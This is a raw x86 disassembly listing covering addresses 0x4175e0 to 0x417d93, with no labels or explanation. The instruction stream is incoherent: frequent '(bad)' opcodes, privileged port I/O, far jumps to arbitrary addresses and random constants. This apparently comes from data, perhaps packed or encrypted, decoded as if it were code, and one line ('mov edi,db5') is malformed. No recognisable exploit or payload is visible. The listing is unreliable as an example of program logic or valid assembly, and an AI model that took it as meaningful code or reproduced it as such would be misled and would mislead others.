  4175e0:	dec    ebp
  4175e1:	sub    BYTE PTR [ecx-0x3f],ch
  4175e4:	pop    edx
  4175e5:	lods   eax,DWORD PTR ds:[esi]
  4175e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e7:	retf   
  4175e8:	pop    ss
  4175e9:	shl    DWORD PTR [esi],1
  4175eb:	pop    eax
  4175ec:	mov    eax,0xd3c9e483
  4175f1:	or     al,0x24
  4175f3:	ficom  DWORD PTR [ebp-0x56dd7c7d]
  4175f9:	lods   al,BYTE PTR ds:[si]
  4175fb:	dec    eax
  4175fc:	inc    ecx
  4175fd:	fnstcw WORD PTR [edx+0x7d]
  417600:	jle    0x41766d
  417602:	imul   edi,DWORD PTR [edi+0x34],0xffffffe1
  417606:	ftst   
  417608:	(bad)  
  417609:	retf   
  41760a:	int3   
  41760b:	or     eax,0x22b2d206
  417610:	sbb    bl,BYTE PTR [edi+0x77]
  417613:	and    BYTE PTR [ebx-0x6a8dc393],bl
  417619:	xchg   esi,eax
  41761a:	inc    ebp
  41761b:	or     eax,0x8ca179a5
  417620:	inc    esp
  417621:	add    ebx,DWORD PTR [ebp-0x18]
  417624:	pop    ebp
  417625:	pop    edi
  417626:	jb     0x41761b
  417628:	jne    0x417657
  41762a:	cmp    eax,0x82610d0a
  41762f:	fwait
  417630:	lock cmp dh,BYTE PTR cs:[ebx-0x3b2a74b4]
  417638:	pop    ebx
  417639:	es in  al,0x9e
  41763c:	mov    ecx,0x9d232e5d
  417641:	jne    0x4175cd
  417643:	push   eax
  417644:	data16 aaa 
  417646:	(bad)  
  417647:	sbb    eax,0x2de8aab1
  41764c:	daa    
  41764d:	jb     0x417600
  41764f:	pop    esi
  417650:	push   edx
  417651:	out    0x6b,eax
  417653:	mov    eax,DWORD PTR [ecx-0x5bd4b47b]
  417659:	outs   dx,DWORD PTR ds:[esi]
  41765a:	enter  0x6b2e,0xd5
  41765e:	aaa    
  41765f:	je     0x4176b3
  417661:	bound  ebx,QWORD PTR [eax-0x9da81c0]
  417667:	bound  esp,QWORD PTR ds:0xb75c9ec0
  41766d:	sar    al,cl
  41766f:	stos   DWORD PTR es:[edi],eax
  417670:	push   esi
  417671:	pop    ebp
  417672:	rcl    DWORD PTR [ebx],cl
  417674:	push   edx
  417675:	dec    edx
  417676:	sub    DWORD PTR [ebx+ebx*8+0x64],edi
  41767a:	xchg   esp,eax
  41767b:	mov    DWORD PTR [eax+eax*2],edi
  41767e:	mov    ds:0x3d164096,al
  417683:	les    esp,FWORD PTR [ebx+0x7c]
  417686:	jne    0x417643
  417688:	xlat   BYTE PTR ds:[ebx]
  417689:	or     esi,DWORD PTR [eax]
  41768b:	xchg   ebx,eax
  41768c:	shl    DWORD PTR [edi+0x50],1
  41768f:	lods   eax,DWORD PTR ds:[esi]
  417690:	ret    0x1e1b
  417693:	nop
  417694:	push   0x7a
  417696:	mov    edi,0x24739ea4
  41769b:	gs push es
  41769d:	loopne 0x4176cd
  41769f:	mov    esp,0x4611f480
  4176a4:	xchg   esi,eax
  4176a5:	scas   eax,DWORD PTR es:[edi]
  4176a6:	daa    
  4176a7:	xor    ebp,0xffffffa0
  4176aa:	ja     0x41770f
  4176ac:	ret    0xe2fc
  4176af:	push   0x1a3c1c7a
  4176b4:	fst    QWORD PTR [edi-0x3bc3fc37]
  4176ba:	test   BYTE PTR [ebp-0x1],ch
  4176bd:	imul   eax,ecx,0x81528ac7
  4176c3:	jle    0x417702
  4176c5:	adc    DWORD PTR [esi+eax*1-0x40],edx
  4176c9:	loopne 0x41764b
  4176cb:	xchg   edx,eax
  4176cc:	mov    bl,0x78
  4176ce:	push   esi
  4176cf:	xchg   edi,eax
  4176d0:	push   esi
  4176d1:	push   cs
  4176d2:	mov    ds:0xca7e1ad9,al
  4176d7:	hlt    
  4176d8:	cmp    ch,BYTE PTR [ecx+0x18]
  4176db:	mov    ah,0x99
  4176dd:	icebp  
  4176de:	gs cs addr16 dec edi
  4176e2:	sub    esp,DWORD PTR [esp+eax*2-0x26f54ffc]
  4176e9:	pushf  
  4176ea:	aam    0x28
  4176ec:	pop    ds
  4176ed:	imul   ecx,DWORD PTR [ecx-0x25],0xffffffff
  4176f1:	sub    al,0xa8
  4176f3:	push   es
  4176f4:	in     eax,dx
  4176f5:	dec    edi
  4176f6:	pop    ebx
  4176f7:	mov    ebx,0x800bcabd
  4176fc:	mov    esp,0x4bb85c93
  417701:	dec    edi
  417702:	test   BYTE PTR [edi],cl
  417704:	and    DWORD PTR [ebx+0x77],edi
  417707:	push   ecx
  417708:	or     ch,BYTE PTR [edi+0xb14dc12]
  41770e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41770f:	xor    DWORD PTR [edi+0x60],eax
  417712:	lahf   
  417713:	pop    ss
  417714:	inc    ecx
  417715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417716:	or     DWORD PTR [ebp-0x15],ebx
  417719:	push   ds
  41771a:	mov    al,ds:0xaf3854c1
  41771f:	and    ecx,eax
  417721:	pop    ds
  417722:	shl    BYTE PTR [edi],cl
  417724:	push   eax
  417725:	cmc    
  417726:	into   
  417727:	ins    BYTE PTR es:[edi],dx
  417728:	pop    edi
  417729:	sub    eax,0xbbb8cc5d
  41772e:	pop    ecx
  41772f:	pusha  
  417730:	das    
  417731:	xchg   DWORD PTR [eax+0x3f],ebx
  417734:	fsub   DWORD PTR [eax+eiz*8+0x1608d65d]
  41773b:	or     al,0x9e
  41773d:	inc    esi
  41773e:	js     0x417744
  417740:	pop    ebp
  417741:	jne    0x4176f5
  417743:	dec    esp
  417744:	popa   
  417745:	or     eax,0x17d2268
  41774a:	clc    
  41774b:	inc    esi
  41774c:	sub    DWORD PTR [eax-0x24],ebp
  41774f:	sub    BYTE PTR [ebx-0x4f],cl
  417752:	jae    0x41773e
  417754:	fdiv   QWORD PTR [ebp*2-0x53cbf223]
  41775b:	retf   0x4434
  41775e:	ins    BYTE PTR es:[edi],dx
  41775f:	(bad)  
  417761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417762:	xchg   ebx,eax
  417763:	sub    eax,0x55401280
  417768:	shl    eax,cl
  41776a:	jns    0x41773b
  41776c:	cmp    al,0x31
  41776e:	pushf  
  41776f:	and    al,0xb5
  417771:	loope  0x4177a5
  417773:	push   edi
  417774:	cmc    
  417775:	pop    esi
  417776:	out    0xc3,eax
  417778:	pushf  
  417779:	push   edi
  41777a:	sbb    BYTE PTR ds:0x529743db,0xbc
  417781:	inc    esi
  417782:	mov    DWORD PTR [edx+ebp*1],0x5109015
  417789:	adc    DWORD PTR [edi-0x15075dea],ecx
  41778f:	or     bh,BYTE PTR [edi-0x5ee1df5b]
  417795:	push   edi
  417796:	push   edx
  417797:	loop   0x4177f4
  417799:	xchg   ecx,eax
  41779a:	das    
  41779b:	pop    ds
  41779c:	dec    ebx
  41779d:	xchg   esp,eax
  41779f:	cld    
  4177a0:	cmp    edi,eax
  4177a2:	xlat   BYTE PTR ds:[ebx]
  4177a3:	mov    al,ds:0xc422a059
  4177a8:	aad    0x91
  4177aa:	pop    ebx
  4177ab:	imul   ebp,DWORD PTR [edi+ecx*4+0x1a5102f9],0x9bbd3cc7
  4177b6:	sbb    BYTE PTR [ecx+0x12],dh
  4177b9:	in     eax,0x78
  4177bb:	jge    0x4177c8
  4177bd:	cmp    BYTE PTR [eax+eax*8],dl
  4177c0:	loope  0x4177e2
  4177c2:	fsub   st(3),st
  4177c4:	clc    
  4177c5:	dec    edx
  4177c6:	push   es
  4177c7:	stos   DWORD PTR es:[edi],eax
  4177c8:	cdq    
  4177c9:	cdq    
  4177ca:	add    DWORD PTR [eax+0x76337960],eax
  4177d0:	in     eax,0x22
  4177d2:	push   0x273bc3bb
  4177d7:	pop    es
  4177d8:	sbb    al,0x41
  4177da:	sbb    DWORD PTR [edx-0x5a],esi
  4177dd:	sbb    al,0x93
  4177df:	rol    BYTE PTR [ebx-0x6c],0xa7
  4177e3:	inc    esp
  4177e4:	cmp    esp,DWORD PTR [edx+0x1715c0e6]
  4177ea:	add    edi,DWORD PTR [edx-0x70e6af02]
  4177f0:	test   al,0x1b
  4177f2:	xchg   ebp,eax
  4177f3:	sbb    BYTE PTR [edi+eiz*4+0x61],0x5f
  4177f8:	stos   DWORD PTR es:[edi],eax
  4177f9:	(bad)  
  4177fa:	retf   
  4177fb:	outs   dx,DWORD PTR ds:[esi]
  4177fc:	mov    WORD PTR [ecx+0x6b5dce4e],gs
  417802:	(bad)  
  417803:	jl     0x417788
  417805:	dec    esp
  417806:	lahf   
  417807:	jle    0x417839
  417809:	pop    edx
  41780a:	jle    0x417874
  41780c:	sub    DWORD PTR [eax+0x5d1517bc],edi
  417812:	in     eax,0xf2
  417814:	cs push es
  417816:	cmp    eax,DWORD PTR ds:0xc6575cb7
  41781c:	and    edx,DWORD PTR [eax-0x51f9c759]
  417822:	ret    
  417823:	and    eax,0xcfddbd55
  417828:	cmp    BYTE PTR [esi-0x64],ah
  41782b:	sub    al,0x2c
  41782d:	cwde   
  41782e:	xchg   DWORD PTR [ebp+esi*4+0x6929f8fb],esi
  417835:	(bad)  
  417836:	sti    
  417837:	mul    DWORD PTR [ebp-0x7beb929]
  41783d:	xchg   ecx,eax
  41783e:	xlat   BYTE PTR ds:[ebx]
  41783f:	ja     0x4177e0
  417841:	mul    DWORD PTR [ecx]
  417843:	mov    cl,0xb6
  417845:	jmp    0x4177cb
  417847:	mov    ah,BYTE PTR [edi]
  417849:	xchg   edi,eax
  41784a:	jmp    0x417830
  41784c:	out    dx,al
  41784d:	dec    esi
  41784e:	inc    ebp
  41784f:	sub    edx,ecx
  417851:	jne    0x417805
  417853:	ret    
  417854:	retf   0x921d
  417857:	mov    eax,ds:0xc6290b4e
  41785c:	jl     0x4177e3
  41785e:	jae    0x4177ed
  417860:	jbe    0x4178b9
  417862:	das    
  417863:	jmp    0xa5dd38b6
  417868:	rcr    DWORD PTR [esi],cl
  41786a:	sub    esp,DWORD PTR [ebx+0x6d0456db]
  417870:	ja     0x4178ad
  417872:	add    BYTE PTR [bp+si],ah
  417875:	mov    edx,esp
  417877:	mov    ds:0xe39b0def,eax
  41787c:	cdq    
  41787d:	fistp  WORD PTR [eax]
  41787f:	dec    esp
  417880:	pusha  
  417881:	push   0x24146a56
  417886:	iret   
  417887:	loopne 0x417822
  417889:	xchg   edi,eax
  41788a:	and    bh,BYTE PTR [edi-0x7a]
  41788d:	push   edi
  41788e:	mov    ds:0x96cd0ff,al
  417893:	sbb    edx,ecx
  417895:	sub    eax,0xc4dc1226
  41789a:	sub    ah,BYTE PTR [ebx+0x47544385]
  4178a0:	loop   0x4178c3
  4178a2:	arpl   bx,sp
  4178a4:	and    eax,0x6316f9ac
  4178a9:	jne    0x4178ed
  4178ab:	mov    ebp,0xc779c06c
  4178b0:	jge    0x41790d
  4178b2:	xchg   edi,eax
  4178b3:	stos   DWORD PTR es:[edi],eax
  4178b4:	dec    ecx
  4178b5:	inc    ebx
  4178b6:	call   0x40ec:0x66958044
  4178bd:	test   DWORD PTR [edx+0x2436b453],edi
  4178c3:	inc    edx
  4178c4:	xchg   esp,eax
  4178c5:	pop    ecx
  4178c6:	or     al,0xae
  4178c8:	loope  0x41785f
  4178ca:	xchg   ebx,eax
  4178cb:	jmp    0xe660:0x4595f017
  4178d2:	cmp    cl,BYTE PTR [esi+0x58]
  4178d5:	out    dx,al
  4178d6:	inc    ebx
  4178d7:	xlat   BYTE PTR ds:[ebx]
  4178d8:	in     eax,dx
  4178d9:	mov    bl,0xe9
  4178db:	mov    esi,0xa30cc484
  4178e0:	push   0xffffff8a
  4178e2:	xchg   esp,eax
  4178e3:	retf   0xd15f
  4178e6:	adc    cl,0x17
  4178e9:	mov    al,BYTE PTR [ebp-0x61]
  4178ec:	pushf  
  4178ed:	enter  0x2c70,0x16
  4178f1:	ret    
  4178f2:	es dec esi
  4178f4:	stc    
  4178f5:	ror    BYTE PTR [ebp-0x48f04b8d],cl
  4178fb:	jp     0x41792b
  4178fd:	ror    esp,cl
  4178ff:	arpl   WORD PTR [esi+0x38],bp
  417902:	mov    bh,0x20
  417904:	cmp    BYTE PTR ds:0xaddc90dc,bh
  41790a:	adc    bh,ch
  41790c:	loope  0x417899
  41790e:	mov    esi,0xa123ae4
  417913:	xchg   edi,ebx
  417915:	adc    BYTE PTR [edi-0x6e],dh
  417918:	fistp  QWORD PTR [eax-0x56]
  41791b:	pushf  
  41791c:	xlat   BYTE PTR ds:[ebx]
  41791d:	cmp    esi,eax
  41791f:	pop    ds
  417920:	or     eax,0x656bfd2c
  417925:	lods   eax,DWORD PTR ds:[esi]
  417926:	mov    ah,0x6f
  417928:	cmp    BYTE PTR [esi+0x6],ch
  41792b:	fwait
  41792c:	loope  0x417986
  41792e:	jmp    FWORD PTR [edi-0x682255c8]
  417934:	jmp    0x68bd:0xcbd9880f
  41793b:	xchg   edx,eax
  41793c:	aas    
  41793d:	mov    eax,DWORD PTR [esi]
  41793f:	mov    bh,0x1e
  417941:	jns    0x417977
  417943:	aas    
  417944:	jle    0x4178db
  417946:	sti    
  417947:	adc    edi,DWORD PTR [ecx-0x7a]
  41794a:	outs   dx,DWORD PTR ds:[esi]
  41794b:	loop   0x41796d
  41794d:	adc    ch,BYTE PTR [ecx-0x43bbc710]
  417953:	mov    esi,0x57ef8dde
  417958:	neg    bh
  41795a:	lds    esp,FWORD PTR [esi+0x69]
  41795d:	mov    al,ds:0xa9f7c2d
  417962:	popf   
  417963:	scas   eax,DWORD PTR es:[edi]
  417964:	jb     0x41791f
  417966:	push   esp
  417967:	loopne 0x41797c
  417969:	loopne 0x4179aa
  41796b:	stc    
  41796c:	mov    bl,0xb7
  41796e:	mov    BYTE PTR [esi-0x30],bl
  417971:	ret    
  417972:	cld    
  417973:	(bad)  
  417974:	xchg   edx,eax
  417975:	shl    DWORD PTR ds:0x1eeadbde,1
  41797b:	and    esi,DWORD PTR [esi]
  41797d:	inc    ebx
  41797e:	ins    BYTE PTR es:[edi],dx
  41797f:	dec    esi
  417980:	pop    ebx
  417981:	das    
  417982:	jecxz  0x4179ea
  417984:	int3   
  417985:	and    al,0x3f
  417987:	aam    0x51
  417989:	mov    al,ds:0xeb873227
  41798e:	push   ecx
  41798f:	adc    DWORD PTR [ebx+0x39],ebp
  417992:	sar    esp,cl
  417994:	out    0x51,al
  417996:	js     0x417985
  417998:	mov    DWORD PTR [ebx+0x7ccfbaad],ebp
  41799e:	int    0x68
  4179a0:	mov    eax,DWORD PTR [eax]
  4179a2:	sbb    eax,0xb9cb78e3
  4179a7:	call   0xee7c0511
  4179ac:	pop    ds
  4179ad:	fs dec esp
  4179af:	mov    al,ds:0x5ee300bc
  4179b4:	sbb    ah,al
  4179b6:	xchg   esp,eax
  4179b7:	mov    ecx,0xafb499cf
  4179bc:	add    bl,BYTE PTR [esi-0x4]
  4179bf:	std    
  4179c0:	arpl   WORD PTR ds:0xb46dd163,dx
  4179c6:	retf   
  4179c7:	pop    ebx
  4179c8:	sub    ecx,ebp
  4179ca:	and    edx,DWORD PTR [edi+0x4efa4a1d]
  4179d0:	retf   0x539b
  4179d3:	in     al,0x38
  4179d5:	cld    
  4179d6:	sub    edi,ebx
  4179d8:	stos   DWORD PTR es:[edi],eax
  4179d9:	loop   0x4179c2
  4179db:	inc    ebx
  4179dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179dd:	jbe    0x417a4b
  4179df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179e0:	scas   al,BYTE PTR es:[edi]
  4179e1:	loopne 0x41798f
  4179e3:	leave  
  4179e4:	test   al,0xb2
  4179e6:	push   edx
  4179e7:	adc    cl,BYTE PTR [edi-0x1a6a7fe0]
  4179ed:	mov    DWORD PTR fs:[edi+0x3b0b1f79],esi
  4179f4:	clc    
  4179f5:	popa   
  4179f6:	and    DWORD PTR [ebp+0xc78c48e],esi
  4179fc:	xchg   esi,eax
  4179fd:	leave  
  4179fe:	mov    dh,0x7e
  417a00:	xchg   ebx,eax
  417a01:	dec    esi
  417a02:	push   ebp
  417a03:	pop    es
  417a04:	sbb    eax,0x7e909ef2
  417a09:	imul   ecx,eax,0x305b10a1
  417a0f:	int    0x76
  417a11:	pop    eax
  417a12:	or     eax,esp
  417a14:	out    0x46,eax
  417a16:	retf   0xe75c
  417a19:	mov    ah,BYTE PTR [eax+0x18]
  417a1c:	call   0xd35fa04d
  417a21:	mov    bl,0x36
  417a23:	jo     0x417a91
  417a25:	scas   eax,DWORD PTR es:[edi]
  417a26:	rol    DWORD PTR [edi-0xf345a5d],1
  417a2c:	popf   
  417a2d:	int    0xb6
  417a2f:	(bad)  
  417a30:	push   ecx
  417a31:	fisttp QWORD PTR [edx+0x677ab5f0]
  417a37:	in     al,dx
  417a38:	pop    es
  417a39:	mov    al,0xa8
  417a3b:	adc    al,0x43
  417a3d:	jg     0x4179d6
  417a3f:	mov    ebx,0x544b093e
  417a44:	sbb    esi,DWORD PTR [ecx]
  417a46:	push   eax
  417a47:	jno    0x417a25
  417a49:	xor    cl,BYTE PTR [eax-0x6efff51]
  417a4f:	sub    eax,0x1e8e8bc0
  417a54:	js     0x4179da
  417a56:	mov    esp,0xd9c267c2
  417a5b:	mov    WORD PTR [edi+0x474a7814],ss
  417a61:	(bad)  
  417a62:	cwde   
  417a63:	imul   ebx,DWORD PTR [esi-0x13c9a01],0x9e70f6c3
  417a6d:	xor    esi,DWORD PTR [esi+eax*1-0x57c029dc]
  417a74:	fld    QWORD PTR [ebx]
  417a76:	test   eax,0xf9411eb0
  417a7b:	or     al,0x48
  417a7d:	fist   DWORD PTR [eax+edx*8]
  417a80:	push   0xfc9e04bb
  417a85:	cmp    eax,0x8fd56288
  417a8a:	cmc    
  417a8b:	mov    ecx,0xb69921f5
  417a90:	into   
  417a91:	lds    eax,FWORD PTR [edi+0x1ec2de7f]
  417a97:	adc    al,BYTE PTR [ebx+0x57a64976]
  417a9d:	fcmovnbe st,st(7)
  417a9f:	rol    ecx,cl
  417aa1:	fidivr WORD PTR [edx]
  417aa3:	and    eax,0x29f36d4b
  417aa8:	imul   edi,DWORD PTR [esi],0x322a2d56
  417aae:	fsubr  st(3),st
  417ab0:	mov    cl,0x94
  417ab2:	(bad)  
  417ab3:	ficomp WORD PTR [edi-0x2804dfb6]
  417ab9:	(bad)  
  417aba:	popa   
  417abb:	mov    dl,0x36
  417abd:	pop    ds
  417abe:	sbb    dh,ch
  417ac0:	dec    edx
  417ac1:	xchg   ebp,eax
  417ac2:	mov    eax,ds:0xfed7b84c
  417ac7:	mov    eax,ds:0xc31a345f
  417acc:	cmc    
  417acd:	sbb    ecx,DWORD PTR [ecx+ebx*8+0x793518bd]
  417ad4:	fsubr  st,st(7)
  417ad6:	aaa    
  417ad7:	push   eax
  417ad8:	cmp    esp,DWORD PTR [esi-0xb]
  417adb:	adc    BYTE PTR [eax+esi*2+0x6b],ah
  417adf:	pop    eax
  417ae0:	int3   
  417ae1:	into   
  417ae2:	std    
  417ae3:	fcomp  DWORD PTR [edi+0x68641602]
  417ae9:	pop    ecx
  417aea:	fmulp  st(0),st
  417aec:	adc    ebp,DWORD PTR [ebp-0x101ba15e]
  417af2:	adc    al,BYTE PTR [eax]
  417af4:	cmp    eax,0xf879ed44
  417af9:	int3   
  417afa:	mov    eax,ds:0x8f17b8f7
  417aff:	jg     0x417aec
  417b01:	(bad)  
  417b02:	pushf  
  417b03:	ins    BYTE PTR es:[edi],dx
  417b04:	and    DWORD PTR [edx+0x51],0x69
  417b08:	sub    ecx,edi
  417b0a:	sbb    eax,0x44ef81bd
  417b0f:	popf   
  417b10:	in     al,dx
  417b11:	es push es
  417b13:	xchg   esp,eax
  417b14:	inc    ebp
  417b15:	jecxz  0x417b91
  417b17:	jecxz  0x417ab5
  417b19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b1a:	mov    esi,0x95269a8b
  417b1f:	add    eax,0xb2805afe
  417b24:	es jle 0x417b33
  417b27:	(bad)  
  417b28:	(bad)  
  417b29:	and    ch,al
  417b2b:	loopne 0x417acb
  417b2d:	out    0xf5,eax
  417b2f:	push   ds
  417b30:	pop    esi
  417b31:	call   0x69dcfbbd
  417b36:	pop    eax
  417b37:	jne    0x417b48
  417b39:	add    BYTE PTR [eax+ecx*2+0x8],ch
  417b3d:	mov    al,0x44
  417b3f:	mov    al,0xa9
  417b41:	jne    0x417b99
  417b43:	cld    
  417b44:	jno    0x417b77
  417b46:	outs   dx,BYTE PTR ds:[esi]
  417b47:	imul   edi,edi,0x4753d5a3
  417b4d:	lock mov ebp,0xfade16d0
  417b53:	in     al,0xd6
  417b55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b56:	(bad)  
  417b57:	fsubp  st(2),st
  417b59:	mov    esp,0xcc4eb01e
  417b5e:	mov    ds:0xf24f0387,eax
  417b63:	rol    DWORD PTR [ebx-0xe540ba2],cl
  417b69:	out    0x6,al
  417b6b:	pop    ebp
  417b6c:	push   es
  417b6d:	adc    BYTE PTR [eax+0x4b],dl
  417b70:	xor    eax,0x36f266f5
  417b75:	repnz inc edi
  417b77:	ds loopne 0x417beb
  417b7a:	sub    DWORD PTR [eiz*1+0x2de86ca],ebx
  417b81:	daa    
  417b82:	sahf   
  417b83:	outs   dx,DWORD PTR ds:[esi]
  417b84:	xor    eax,0x4dea7a37
  417b89:	popf   
  417b8a:	pop    ebx
  417b8b:	dec    edx
  417b8c:	arpl   WORD PTR [edx+0x11],sp
  417b8f:	test   al,0xb1
  417b91:	or     edi,DWORD PTR [eax+edi*4]
  417b94:	pop    ebp
  417b95:	and    DWORD PTR [ebx+0x2d],ebp
  417b98:	stos   BYTE PTR es:[edi],al
  417b99:	push   0xa7ac7151
  417b9e:	sub    al,BYTE PTR [esi]
  417ba0:	add    BYTE PTR [ebp+0x20ffbf59],dh
  417ba6:	lock outs dx,BYTE PTR ds:[esi]
  417ba8:	call   0xe61e:0xfc00ed0c
  417baf:	push   0x797c08f7
  417bb4:	je     0x417b99
  417bb6:	mul    BYTE PTR [edi]
  417bb8:	hlt    
  417bb9:	sub    al,0xc3
  417bbb:	rcr    BYTE PTR [edi],cl
  417bbd:	xor    eax,0xcccc12bf
  417bc2:	cmp    DWORD PTR ds:0xab8f8311,esi
  417bc8:	fstp   DWORD PTR [esi]
  417bca:	cmp    bh,BYTE PTR [ebx+eax*4-0x43]
  417bce:	orps   xmm4,XMMWORD PTR [edi+0x77]
  417bd2:	iret   
  417bd3:	call   0xd88e3a3f
  417bd8:	lods   al,BYTE PTR ds:[esi]
  417bd9:	sub    DWORD PTR [edi-0x6a],esp
  417bdc:	sti    
  417bdd:	mov    ebp,0xc8af8768
  417be2:	mov    edi,db5
  417be5:	cmp    BYTE PTR ds:0xc7b17374,bh
  417beb:	adc    edx,DWORD PTR ds:0xed9849a
  417bf1:	push   cs
  417bf2:	hlt    
  417bf3:	mov    al,ds:0x7f86ef69
  417bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417bf9:	cmp    eax,0x753647f4
  417bfe:	cld    
  417bff:	adc    bh,BYTE PTR [eax-0x45449a5a]
  417c05:	jns    0x417bc4
  417c07:	dec    esi
  417c08:	(bad)  
  417c0a:	mov    esp,0xdd788b1f
  417c0f:	xchg   esp,eax
  417c10:	or     ecx,DWORD PTR [ecx+0xe]
  417c13:	aas    
  417c14:	int    0xc0
  417c16:	out    dx,al
  417c17:	add    al,0xff
  417c19:	sbb    dl,BYTE PTR [ebp+edi*8-0x5e17dc63]
  417c20:	call   0x60d5:0xf06e2edb
  417c27:	das    
  417c28:	gs stos DWORD PTR es:[edi],eax
  417c2a:	fs push es
  417c2c:	and    BYTE PTR [edx],cl
  417c2e:	les    eax,FWORD PTR [edi+0x77916ced]
  417c34:	sbb    ah,BYTE PTR [ebx-0x6f3d1fed]
  417c3a:	sub    edx,ebp
  417c3c:	adc    al,0x6e
  417c3e:	aam    0x7d
  417c40:	(bad)  
  417c41:	cmp    eax,0x9ff76eba
  417c46:	imul   edx,DWORD PTR [eax-0x4b],0xffffffec
  417c4a:	xlat   BYTE PTR ds:[ebx]
  417c4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c4c:	mov    dl,0xe8
  417c4e:	push   edx
  417c4f:	aam    0x5e
  417c51:	fnsave [edx]
  417c53:	dec    edx
  417c54:	(bad)  
  417c55:	sbb    esi,DWORD PTR [ebx]
  417c57:	mov    ds:0x28bc40de,al
  417c5c:	ds stos DWORD PTR es:[edi],eax
  417c5e:	and    DWORD PTR [esi+0x3062ba81],ecx
  417c64:	sbb    edi,esi
  417c66:	jecxz  0x417be8
  417c68:	cmp    eax,eax
  417c6a:	test   DWORD PTR [edx+0x775fc07e],eax
  417c70:	push   es
  417c71:	jmp    0x417cc3
  417c73:	fld    st(4)
  417c75:	test   BYTE PTR [eax+esi*4-0x68],ah
  417c79:	xchg   esp,eax
  417c7a:	aam    0xe8
  417c7c:	mov    edi,0x3388dbb6
  417c81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c82:	mov    al,BYTE PTR [eax+0x71afca02]
  417c88:	adc    al,BYTE PTR [esi]
  417c8a:	loopne 0x417c94
  417c8c:	inc    esp
  417c8d:	fwait
  417c8e:	add    dl,BYTE PTR [ebx]
  417c90:	test   DWORD PTR [esi+esi*2],ebp
  417c93:	inc    ebp
  417c94:	pop    edi
  417c95:	sub    al,0x72
  417c97:	(bad)  
  417c98:	jecxz  0x417cee
  417c9a:	push   ds
  417c9b:	punpcklwd mm1,DWORD PTR [ebx+0x5a214bfd]
  417ca2:	sub    eax,0x750338f3
  417ca7:	mov    eax,ds:0x506d63d8
  417cac:	inc    esi
  417cad:	pop    esp
  417cae:	in     al,dx
  417caf:	in     al,dx
  417cb0:	pop    ds
  417cb1:	pop    edx
  417cb2:	mov    ebx,0xa67fa0bf
  417cb7:	scas   al,BYTE PTR es:[edi]
  417cb8:	test   BYTE PTR [esi],cl
  417cba:	adc    DWORD PTR [ecx+ebp*1-0x64612b35],ebp
  417cc1:	shl    dl,0x5a
  417cc4:	or     edx,esi
  417cc6:	sub    BYTE PTR [edx+0x18],bh
  417cc9:	or     esp,DWORD PTR [esi]
  417ccb:	loopne 0x417c5e
  417ccd:	lods   al,BYTE PTR ds:[esi]
  417cce:	jg     0x417c69
  417cd0:	sub    eax,0x607ef487
  417cd5:	jmp    0x417d37
  417cd7:	(bad)  
  417cd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cda:	leave  
  417cdb:	dec    ebp
  417cdc:	retf   0xc1ac
  417cdf:	gs xchg ebx,eax
  417ce1:	imul   BYTE PTR [ebx]
  417ce3:	ja     0x417cab
  417ce5:	jecxz  0x417d10
  417ce7:	into   
  417ce8:	and    BYTE PTR [ebp-0x6c5d7bef],dh
  417cee:	inc    ebx
  417cef:	push   ecx
  417cf0:	int3   
  417cf1:	or     BYTE PTR [ebp-0x5ab1184d],al
  417cf7:	stos   DWORD PTR es:[edi],eax
  417cf8:	popa   
  417cf9:	xor    eax,0x4659d1ac
  417cfe:	(bad)  
  417cff:	outs   dx,BYTE PTR ds:[esi]
  417d00:	adc    DWORD PTR [edi+0x50],0xffffff9c
  417d04:	int    0x31
  417d06:	test   bh,0x5b
  417d09:	fcomi  st,st(4)
  417d0b:	xchg   ebp,eax
  417d0c:	adc    ebx,DWORD PTR [ecx-0x80]
  417d0f:	(bad)  
  417d10:	push   ebx
  417d11:	dec    DWORD PTR [eax+0x19056747]
  417d17:	dec    esi
  417d18:	dec    eax
  417d19:	mov    dh,0x2b
  417d1b:	push   ecx
  417d1c:	in     al,dx
  417d1d:	imul   esi,DWORD PTR [ebx-0x204fd84e],0x499f573f
  417d27:	xchg   ecx,eax
  417d28:	fsubr  st(5),st
  417d2a:	xchg   DWORD PTR [esi-0x4d5c40a6],ebp
  417d30:	inc    esp
  417d31:	sbb    BYTE PTR [eax],ch
  417d33:	jecxz  0x417d19
  417d35:	jge    0x417d42
  417d37:	jb     0x417d20
  417d39:	inc    ecx
  417d3a:	bound  ebx,QWORD PTR [edx-0x75d68142]
  417d40:	mov    ah,0xcb
  417d42:	loopne 0x417d33
  417d44:	stos   BYTE PTR es:[edi],al
  417d45:	in     eax,0x3
  417d47:	mov    edx,0x73a42fc5
  417d4c:	and    ah,BYTE PTR [ebx]
  417d4e:	and    eax,0x300d5929
  417d53:	nop
  417d54:	lods   eax,DWORD PTR ds:[esi]
  417d55:	xchg   DWORD PTR [edx],esi
  417d57:	popf   
  417d58:	or     cl,BYTE PTR [edx+ecx*1]
  417d5b:	int    0x4e
  417d5d:	xchg   esp,eax
  417d5e:	mov    dh,0x51
  417d60:	rol    BYTE PTR [esi],1
  417d62:	outs   dx,DWORD PTR ds:[esi]
  417d63:	and    eax,0x336138db
  417d68:	jo     0x417db6
  417d6a:	fnsave [edi]
  417d6c:	add    BYTE PTR [eax],al
  417d6e:	jecxz  0x417d94
  417d70:	and    cl,BYTE PTR [esi-0x38b70089]
  417d76:	xlat   BYTE PTR ds:[ebx]
  417d77:	xchg   esi,esi
  417d79:	xor    BYTE PTR [ecx+0x1680780f],ch
  417d7f:	ins    BYTE PTR es:[edi],dx
  417d80:	sbb    ch,ah
  417d82:	pop    ecx
  417d83:	es jbe 0x417d49
  417d86:	out    dx,al
  417d87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d88:	cmc    
  417d89:	test   al,0x5d
  417d8b:	xor    BYTE PTR [ebx+0x3269797e],dh
  417d91:	dec    ebx
  417d92:	inc    eax
  417d93:	mov    ch,0x8a
